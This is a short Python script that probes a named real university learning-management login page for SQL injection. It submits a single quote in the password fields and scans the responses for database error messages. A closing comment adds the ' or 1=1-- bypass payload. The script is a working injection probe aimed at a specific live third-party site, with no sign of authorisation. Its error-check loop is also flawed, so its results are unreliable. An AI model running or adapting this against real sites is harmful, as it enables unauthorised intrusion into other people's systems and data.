import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse,urljoin
from colorama import init,Fore

init()
url = "http://lms.ue.edu.pk/LMS_LandingPage.aspx?id=095b29e1-e3e2-4431-b7b5-588859127803"
response = requests.get(url)
     
soup = BeautifulSoup(response.text,'html.parser')
forms = soup.find_all('form')
data_dict = {}
for f in forms:
    for i in f.find_all('input'):
        name = i.get('name')
        type_ = i.get('type')
        if type_ == 'text':
            value = 'user@email.com'
        elif type_ == 'password':
            value = "'"
        elif type_ == 'submit':
            value = i.get('value')
        elif type_ == 'hidden':
            value = i.get('value')

        data_dict[name] = value
    print(data_dict)
    print(url)
    res = requests.post(url,data_dict)
    #print(res.text)
    errors = [
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
        ]
for err in errors:
    if err in res.text.lower():
        print(f'\n{Fore.GREEN} SQL discovered > {Fore.WHITE} {url} {Fore.RESET}\n')
        break
    else:
        print('Not found')
#print(forms)


# ' or 1=1--
